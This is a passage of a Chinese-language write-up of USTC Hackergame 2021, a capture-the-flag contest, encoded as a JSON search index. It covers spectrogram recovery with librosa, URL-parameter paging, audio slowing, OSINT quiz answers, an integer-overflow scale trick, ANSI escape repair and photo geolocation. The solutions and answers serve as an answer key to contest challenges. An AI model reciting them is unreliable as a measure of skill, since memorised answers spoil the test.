\u800c\u8f6c\u7f6e\u8fc7\u6765\u662f\uff1a [[ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 48. - 44. - 40. ... - 42. - 44. - 46. ] [ - 30. - 26. - 16. ... - 30. - 32. - 34. ] ... [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ] [ - 58. - 58. - 58. ... - 58. - 58. - 58. ]] \u51cf\u53bb min_db=-60 \u7b2c\u4e00\u884c\u6b63\u597d\u662f 2\uff0c\u7b2c\u4e8c\u884c\u662f [12. 16. 20. ... 18. 16. 14.] \u518d\u5bf9\u5e94\u5230\u751f\u6210\u7684 gif \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u770b\u51fa gif \u7684\u7b2c\u4e00\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u90fd\u662f 2 \u800c\u7b2c\u4e8c\u5e27\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\u4e5f\u6070\u597d\u662f\u521a\u5f97\u51fa\u7684\u90a3\u7ec4\u6570 \u6240\u4ee5\u8981\u5f97\u5230\u7684 spectrogram \u5c31\u662f gif \u6bcf\u4e00\u5e27\u6240\u6709\u77e9\u5f62\u7684\u9ad8\u5ea6\u6784\u6210\u7684\u77e9\u9635\u7684\u8f6c\u7f6e \u518d\u7ed3\u5408\u6e90\u7801\uff1a numpy . array ([ [ red_pixel if freq % 2 and round ( frame [ freq // 2 ]) > threshold else white_pixel for threshold in list ( range ( min_db , max_db + 1 , quantize ))[:: - 1 ] ] for freq in range ( num_freqs * 2 + 1 ) ]) \u53ef\u4ee5\u770b\u51fa\uff0c\u6bcf\u4e2a\u77e9\u5f62\u52a0\u4e0a\u5de6\u8fb9\u7684\u7a7a\u683c\u6b63\u597d\u662f 4 \u4e2a\u50cf\u7d20\uff0c\u6240\u4ee5\u6bcf\u56db\u5217\u8bfb\u53d6\u6700\u540e\u4e00\u5217\u5373\u53ef\uff1a spectrogramT = [] for data in gif_data : res = [] for ind , line in enumerate ( data . transpose ()): # \u5c06\u6bcf\u4e00\u5e27\u8f6c\u7f6e\uff0c\u65b9\u4fbf\u8ba1\u7b97 num = sum ( line ) # \u8ba1\u7b97\u6bcf\u4e2a\u77e9\u5f62\u7684\u9ad8\u5ea6\uff08\u8f6c\u7f6e\u540e\u662f\u5bbd\u5ea6\uff09 if ind % 4 == 3 : res . append ( num + min_db ) # \u5f97\u5230\u7684\u6570\u8981\u52a0\u4e0a-60\u624d\u7b26\u5408\u89c4\u77e9 spectrogramT . append ( res ) spectrogram = np . array ( spectrogramT ) . transpose () # \u5f97\u5230\u7684\u7ed3\u679c\u8f6c\u7f6e\u4e00\u4e0b \u8fd9\u6837\u5c31\u5f97\u5230\u4e86\u6885\u5c14\u9891\u8c31\u56fe\u7684\u6570\u636e\uff0c\u53ef\u4ee5\u5bf9 librosa \u7684\u90e8\u5206\u8fdb\u884c\u9006\u8fc7\u7a0b\u4e86 \u7ffb librosa \u7684\u6587\u6863\uff0c\u6709 power_to_db \u5f53\u7136\u4e5f\u5c31\u6709 db_to_power \u800c\u4e14\u7c7b\u4f3c\u4e8e melspectrogram \u51fd\u6570\u5728 librosa.feature \u4e2d\uff0c\u53ef\u4ee5\u4e13\u95e8\u770b feature \u90e8\u5206\u7684\u6587\u6863 \u7ffb\u5230\u4e86 inverse \u90e8\u5206\uff0c\u53ef\u4ee5\u770b\u5230\u6709\u4e00\u4e2a\u51fd\u6570 librosa.feature.inverse.mel_to_audio \u53ef\u4ee5\u76f4\u63a5\u628a\u6885\u5c14\u9891\u8c31\u56fe\u4e13\u4e3a\u97f3\u9891\u6570\u636e\uff0c\u6240\u4ee5\u5c31\u7528\u5b83\u4e86\uff1a y = librosa . feature . inverse . mel_to_audio ( librosa . db_to_power ( spectrogram ), # \u4e58\u4e8c\u9664\u4e8c\u6ca1\u4ec0\u4e48\u5927\u7528\uff0c\u800c\u4e14\u5f71\u54cd\u6548\u679c\uff0c\u5c31\u5220\u4e86 sample_rate , n_iter = num_freqs , # \u91c7\u6837\u7387\u9898\u76ee\u63d0\u4f9b\u4e86\uff0c\u662f 22050Hz n_fft = fft_window_size , hop_length = frame_step_size , window = window_function_type , ) \u8fd9\u6837\u5c31\u5b8c\u6210\u4e86\u8fd8\u539f\uff0c\u6700\u540e\u662f\u8f93\u51fa\uff0c\u4f46\u662f\u5e76\u6ca1\u5728 librosa \u4e2d\u627e\u5230\u97f3\u9891\u8f93\u51fa\u7684\u51fd\u6570\uff0c\u6240\u4ee5\u5c31\u7528\u4e86\u7ecf\u5178 soundfile \uff1a import soundfile as sf sf . write ( \"flag.wav\" , y , sample_rate ) \u7136\u540e\u6253\u5f00\u542c\u5c31\u884c\u4e86\uff0c\u9898\u76ee\u8bf4\u4e86\u662f\u4e2a 12 \u4f4d\u6570\uff0c\u6240\u4ee5\u5269\u4e0b\u7684\u5c31\u662f\u82f1\u8bed\u542c\u529b\u4e86\uff0c\u7ffb\u8bd1\u8fc7\u6765\u7684\u6570\u5b57\u5c31\u662f flag \u4e86 Reference \u00b6 Hackergame \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 - \u77e5\u4e4e LUG@USTC \u5b98\u7f51 Wayback Machine archive.org SIGBOVIK 2021 \u767e\u5ea6\u5168\u666f\u5730\u56fe \u4f2a\u9020http\u8bf7\u6c42ip\u5730\u5740 - \u535a\u5ba2\u56ed GraphQL\u5b98\u7f51 \u3001 GraphiQL \u3001 GraphQL Voyager \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e librosa\u6587\u6863 PySoundFile\u6587\u6863 Wilson's theorem - wikipedia BUU-RSA [RoarCTF2019]babyRSA - CSDN Euler's totient function - wikipedia LUKS2 doc pdf 10 Linux cryptsetup Examples for LUKS Key Management pyinstxtractor uncompyle6","title":"USTC Hackergame 2021"},{"location":"writeups/hackergame2021/#hackergame-2021-writeup","text":"Abstract \u53c2\u52a0\u7684\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u7b97\u662f CTF \u7684\u6bd4\u8d5b\u3002\u8fd9\u91cc\u662f\u6211\u505a\u51fa\u7684\u9898\u7684 writeup\uff0c\u535a\u5ba2\u7248\u5728\uff1a https://blog.tonycrane.cc/p/c05d7b7c.html \u5b98\u65b9 writeup","title":"Hackergame 2021 Writeup"},{"location":"writeups/hackergame2021/#_1","text":"\u4e3a\u4e86\u80fd\u8ba9\u5927\u5bb6\u987a\u5229\u7b7e\u5230\uff0c\u547d\u9898\u7ec4\u628a\u6bcf\u4e00\u79d2\u7684 flag \u90fd\u8bb0\u5f55\u4e0b\u6765\u5236\u6210\u4e86\u65e5\u8bb0\u672c\u7684\u4e00\u9875\u3002\u4f60\u53ea\u9700\u8981\u6253\u5f00\u65e5\u8bb0\uff0c\u7ffb\u5230 Hackergame 2021 \u6bd4\u8d5b\u8fdb\u884c\u671f\u95f4\u7684\u4efb\u4f55\u4e00\u9875\u5c31\u80fd\u5f97\u5230 flag\uff01 \u5f88\u660e\u786e\uff0c\u8fdb\u5165\u7f51\u5740\u540e\u4e00\u76f4\u70b9 Next \u7ffb\u5230\u6bd4\u8d5b\u65f6\u95f4\u5c31\u597d\u4e86\uff08\u8bef \u770b\u5230\u4e86 URI \u91cc\u6709 ?page=... \uff0c\u6240\u4ee5\u4e5f\u61d2\u5f97\u8ba1\u7b97\u4e86\uff0c\u624b\u52a8\u4e8c\u5206\uff0c\u5927\u6982 ?page=1635000000 \u5de6\u53f3\u5c31\u53ef\u4ee5\u770b\u5230 flag \u4e86 \u8d5b\u540e\u624d\u53cd\u5e94\u8fc7\u6765\u539f\u6765\u662f UNIX \u65f6\u95f4\u6233","title":"\u7b7e\u5230"},{"location":"writeups/hackergame2021/#_2","text":"\u4e5f\u5f88\u660e\u786e\uff0c\u76f4\u63a5\u628a\u53f3\u4fa7\u6321\u4f4f\u7684 flag \u90e8\u5206\u5bf9\u5e94\u5de6\u8fb9\u7684\u5341\u516d\u8fdb\u5236\u6570\u6362\u7b97\u6210\u5341\u8fdb\u5236\uff0c\u7136\u540e\u6839\u636e ASCII \u7801\u8f6c\u6210\u5b57\u7b26\u3002\u6216\u8005\u76f4\u63a5\u628a\u5de6\u4fa7\u6284\u8fdb Hex Friend \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u53f3\u4fa7\u7684flag\u3002 \uff08**\u5f53\u65f6\u8fd9\u9898\u6284\u4e32\u884c\u4e86\u4e24\u4e09\u6b21\u2026\u2026\uff09","title":"\u8fdb\u5236\u5341\u516d\u2014\u2014\u53c2\u4e0a"},{"location":"writeups/hackergame2021/#_3","text":"\u5f53\u7136\uff0c\u5982\u679c\u53ea\u662f\u8fd9\u6837\u8fd8\u8fdc\u8fdc\u4e0d\u591f\u3002\u9075\u4f9d\u53f2\u79f0\u201c\u8001\u7239\u201d\u7684\u4e0a\u53e4\u5148\u8d24\u7684\u81f3\u7406\u540d\u8a00\uff0c\u5fc5\u987b\u8981\u201c\u7528\u9b54\u6cd5\u6253\u8d25\u9b54\u6cd5\u201d\u3002X \u540c\u5b66\u5411\u4e0a\u7ea7\u7533\u8bf7\u5230\u4e86\u79d1\u5927\u897f\u533a\u540c\u6b65\u8f90\u5c04\u5b9e\u9a8c\u5ba4\u8bbe\u5907\u7684\u4f7f\u7528\u6743\u9650\uff0c\u4ee5\u6b64\u6253\u901a\u6b21\u5143\u7a7a\u95f4\uff0c\u501f\u52a9\u5230\u53e6\u4e00\u4e2a\u5e73\u884c\u5b87\u5b99\u4e2d Z \u540c\u5b66\u7684\u6cd5\u529b\u8fdb\u884c\u6570\u636e\u5bf9\u51b2\uff0c\u65b9\u624d\u4e8e\u4e71\u4e2d\u640f\u5f97\u4e00\u4e1d\u673a\u4f1a\uff0c\u5c06 flag \u7528\u65e0\u7ebf\u7535\u7684\u5f62\u5f0f\u53d1\u5c04\u4e86\u51fa\u53bb\u3002 \u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86\u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5\u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u3002\u5373\u4f7f\u5982\u6b64\uff0c\u6253\u7834\u6b21\u5143\u7684\u5f3a\u5927\u80fd\u91cf\u626d\u66f2\u4e86\u65f6\u7a7a\uff0c\u4f7f\u5f97\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684\u901f\u5ea6\u6709\u6240\u6539\u53d8\u3002 \uff08\u8fd9\u9898\u5728\u7fa4\u91cc\u770b\u8d77\u6765\u597d\u50cf\u5361\u4e86\u5f88\u591a\u4eba\uff0c\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff09 \u9898\u76ee\u4e0b\u8f7d\u4e0b\u6765\u662f\u4e00\u4e2a\u542c\u8d77\u6765\u6742\u4e71\u7684\u97f3\u9891 \u9898\u91cc\u6700\u540e\u8bf4\u4e86 \u201c\u6700\u7ec8\u63a5\u53d7\u5230\u7684\u5f55\u97f3\u7684 \u901f\u5ea6 \u6709\u6240\u6539\u53d8\u201d\uff0c\u6240\u4ee5\u8003\u8651\u5c06\u97f3\u9891\u65f6\u95f4\u62c9\u957f\u3002 \u6700\u5f00\u59cb\u4f7f\u7528\u4e86 Adobe Audition\uff0c\u4f46\u662f\u6548\u679c\u4e0d\u662f\u5f88\u7406\u60f3\uff0c\u5927\u6982\u662f\u91cd\u65b0\u91c7\u6837\u7b49\u4e00\u7cfb\u5217\u7b97\u6cd5\u5bfc\u81f4\u7684 \u6240\u4ee5\u6362\u4e86 Adobe Premier Pro \u76f4\u63a5\u7528\u6bd4\u7387\u62c9\u4f38\u5de5\u5177\u62c9\u957f\u97f3\u9891\uff0c\u8fd8\u662f\u53ef\u4ee5\u542c\u6e05\u7684 \u4e0d\u65ad\u5c1d\u8bd5\u4e4b\u540e\uff0c\u5927\u6982\u653e\u6162\u4e09\u500d\u5de6\u53f3\u5c31\u53ef\u4ee5\u542c\u51fa\u8bfb\u7684\u662f\u82f1\u8bed\u5355\u8bcd\u4e86 \u9898\u91cc\u8bf4\u5230\u4e86 \u201c\u8003\u8651\u5230\u4fe1\u606f\u7684\u9c81\u68d2\u6027\uff0cX \u540c\u5b66\u4f7f\u7528\u4e86 \u65e0\u7ebf\u7535\u4e2d\u60ef\u7528\u7684\u65b9\u6cd5 \u6765\u533a\u5206\u5b57\u7b26\u4e32\u4e2d\u8bfb\u97f3\u76f8\u8fd1\u7684\u5b57\u6bcd\u201d\uff0c\u6240\u4ee5\u5c31\u67e5\u5230\u4e86 \u56fd\u9645\u822a\u7a7a\u65e0\u7ebf\u7535\u901a\u8baf26\u4e2a\u82f1\u6587\u5b57\u6bcd\u8bfb\u6cd5 \u7136\u540e\u4ed4\u7ec6\u542c\uff0c\u8fa8\u522b\u6bcf\u4e2a\u5355\u8bcd\u7684\u7b2c\u4e00\u4e2a\u97f3\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u4e86","title":"\u53bb\u5427\uff01\u8ffd\u5bfb\u81ea\u7531\u7684\u7535\u6ce2"},{"location":"writeups/hackergame2021/#pro-max","text":"\u4e94\u9053\u5201\u94bb\u7684\u9898\u76ee\uff0c\u4f46\u662f\u8fd8\u662f\u597d\u67e5\u5230\u7684\uff0c\u9898\u76ee\u91cc\u4e5f\u8bf4\u4e86\u201c\u89e3\u51fa\u8c1c\u9898\u4e0d\u9700\u8981\u662f\u79d1\u5927\u5728\u6821\u5b66\u751f\u201d 2017 \u5e74\uff0c\u4e2d\u79d1\u5927\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\uff08SEC@USTC\uff09\u5e76\u5165\u4e2d\u79d1\u5927 Linux \u7528\u6237\u534f\u4f1a\uff08USTCLUG\uff09\u3002\u76ee\u524d\uff0c\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u57df\u540d\uff08sec.ustc.edu.cn\uff09\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\uff0c\u4f46\u4f60\u80fd\u627e\u5230\u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u7684\u793e\u56e2\u7ae0\u7a0b\u5728\u54ea\u4e00\u5929\u7684\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u4e0a\u901a\u8fc7\u7684\u5417\uff1f \u770b\u5230\u4e86 \u201c\u76ee\u524d\uff0c\u5df2\u7ecf\u65e0\u6cd5\u8bbf\u95ee\u201d \u8bf4\u660e\u8fd9\u4e2a\u57df\u540d\u66fe\u7ecf\u662f\u53ef\u4ee5\u8bbf\u95ee\u7684\uff0c\u76f4\u63a5\u901a\u8fc7 \u4e92\u8054\u7f51\u7684\u8bb0\u5fc6 archive.org\uff0c\u67e5\u5230\u8fd9\u4e2a\u57df\u540d\u7684\u5386\u53f2\u5b58\u6863\uff0c\u968f\u4fbf\u627e\u4e00\u5929\u5c31\u53ef\u4ee5\u770b\u5230\u4ed6\u4eec\u5b98\u7f51\u4e2d\u7684 \u4fe1\u606f\u5b89\u5168\u4ff1\u4e50\u90e8\u793e\u56e2\u7ae0\u7a0b \u3002 \u5176\u4e2d\u7b2c\u4e00\u884c\u5c31\u5199\u4e86 \u201c\u672c\u7ae0\u7a0b\u5728 2015 \u5e74 5 \u6708 4 \u65e5 \uff0c\u7ecf\u4f1a\u5458\u4ee3\u8868\u5927\u4f1a\u5ba1\u8bae\u901a\u8fc7\u3002\u201d \u6240\u4ee5\u7b54\u6848\u5c31\u662f 20150504 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u5728\u8fd1\u4e94\u5e74\u591a\u5c11\u6b21\u88ab\u8bc4\u4e3a\u6821\u4e94\u661f\u7ea7\u793e\u56e2\uff1f \u76f4\u63a5\u53bb\u79d1\u5927 LUG \u5b98\u7f51\u7684 Intro \u9875\u9762 \uff0c\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u4e8e 2015 \u5e74 5 \u6708\u30012017 \u5e74 7 \u6708\u30012018 \u5e74 9 \u6708\u30012019 \u5e74 8 \u6708\u53ca 2020 \u5e74 9 \u6708\u88ab\u8bc4\u4e3a\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66\u4e94\u661f\u7ea7\u5b66\u751f\u793e\u56e2\u3002\u201d \u6240\u4ee5\u662f4\u6b21\uff08x \u4f46\u662f\u6000\u7591\u4e00\u4e0b\u4e3a\u4ec0\u4e48\u6ca1\u67092021\u5e74\uff0c\u56e0\u4e3a\u90fd\u662f\u57289\u6708\u4efd\u5de6\u53f3\uff0c\u6240\u4ee5\u53ef\u80fd\u662f\u6570\u636e\u6ca1\u66f4\u65b0\uff0c\u8fd9\u98984\u548c5\u90fd\u6709\u53ef\u80fd \u5c1d\u8bd5\u540e\u5f97\u5230\u7b54\u6848\u662f 5 \u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66 Linux \u7528\u6237\u534f\u4f1a\u4f4d\u4e8e\u897f\u533a\u56fe\u4e66\u9986\u7684\u6d3b\u52a8\u5ba4\u95e8\u53e3\u7684\u724c\u5b50\u4e0a\u201cLUG @ USTC\u201d\u4e0b\u65b9\u7684\u5c0f\u5b57\u662f\uff1f \u8fd9\u9898\u4e5f\u7b80\u5355\uff0c\u76f4\u63a5\u95ee\u79d1\u5927\u540c\u5b66\u5c31\u597d\u4e86\uff08x \u7ffb\u4e86 LUG \u7684\u5fae\u4fe1\u516c\u4f17\u53f7\u548c QQ \u5b98\u65b9\u53f7\uff0c\u90fd\u6ca1\u5565\u6536\u83b7\uff0c\u6700\u540e\u53d1\u73b0\u5b98\u7f51\u4e0a\u6709 News \u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u65b0\u542f\u7528\u6d3b\u52a8\u5ba4\u7684\u8bdd\uff0c\u4e00\u5b9a\u4f1a\u6709\u4e00\u7bc7\u65b0\u95fb\u7a3f\uff0c\u641c\u7d22\u201c\u56fe\u4e66\u9986\u201d\u5f97\u5230\u4e86 \u300c\u897f\u533a\u56fe\u4e66\u9986\u65b0\u6d3b\u52a8\u5ba4\u542f\u7528\u300d \u8fd9\u7bc7\u6587\u7ae0\uff0c\u5f00\u7bc7\u7b2c\u4e00\u5f20\u5927\u56fe\u5c31\u662f\u95e8\u53e3\u724c\u5b50\u7684\u7167\u7247 \u6240\u4ee5\u7b54\u6848\u662f Development Team of Library \uff08\u6ce8\u610f\u5927\u5c0f\u5199\uff09 \u5728 SIGBOVIK 2021 \u7684\u4e00\u7bc7\u5173\u4e8e\u4e8c\u8fdb\u5236 Newcomb-Benford \u5b9a\u5f8b\u7684\u8bba\u6587\u4e2d\uff0c\u4f5c\u8005\u4e00\u5171\u5c55\u793a\u4e86\u591a\u5c11\u4e2a\u6570\u636e\u96c6\u5bf9\u5176\u7406\u8bba\u7ed3\u679c\u8fdb\u884c\u9a8c\u8bc1\uff1f \u5e94\u8be5\u6ca1\u5fc5\u8981\u641c\u8c37\u6b4c\u5b66\u672f\u4e4b\u7c7b\u7684\uff0c\u76f4\u63a5\u5fc5\u5e94\u67e5 \u201cSIGBOVIK Newcomb-Benford\u201d \u5c31\u53ef\u4ee5\u627e\u5230 SIGBOVIK \u7684 \u8fd9\u4e00\u7bc7\u5927\u6587\u7ae0\u5408\u96c6 \uff0c\u518d\u641c\u7d22 Newcomb \u5c31\u53ef\u4ee5\u770b\u5230\u9898\u76ee\u91cc\u8bf4\u7684\u8bba\u6587\u4e86\u3002 \u5168\u6587\u4e5f\u4e0d\u957f\uff0c\u53ea\u6709\u56db\u9875\uff0c\u540e\u4e24\u9875\u5168\u662f\u6570\u636e\u7684\u56fe\uff0c\u6570\u4e00\u4e0b\uff0c\u4e00\u5171\u670913\u5e45 \u6240\u4ee5\u7b54\u6848\u662f 13 \u4e0d\u4e25\u683c\u9075\u5faa\u534f\u8bae\u89c4\u8303\u7684\u64cd\u4f5c\u7740\u5b9e\u4ee4\u4eba\u751f\u538c\uff0c\u597d\u5728 IETF \u4e8e 2021 \u5e74\u6210\u7acb\u4e86 Protocol Police \u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f \u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null \u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag","title":"\u732b\u54aa\u95ee\u7b54 Pro Max"},{"location":"writeups/hackergame2021/#_4","text":"\u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002 \u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09 \u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20 \u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01","title":"\u5356\u74dc"},{"location":"writeups/hackergame2021/#_5","text":"\u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002 \u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a [ ; m \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 \\033[...m; \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b \u91cd\u8981\u6210\u5206 \u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a [ \u5168\u5c40\u66ff\u6362\u4e3a \\033[ \uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09 \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09","title":"\u900f\u660e\u7684\u6587\u4ef6"},{"location":"writeups/hackergame2021/#_6","text":"\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002 \u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002 \u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 \u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22 \uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d \u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c \u7136\u540e\u662f5\u4e2a\u95ee\u9898 \u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a \u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357 \u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a 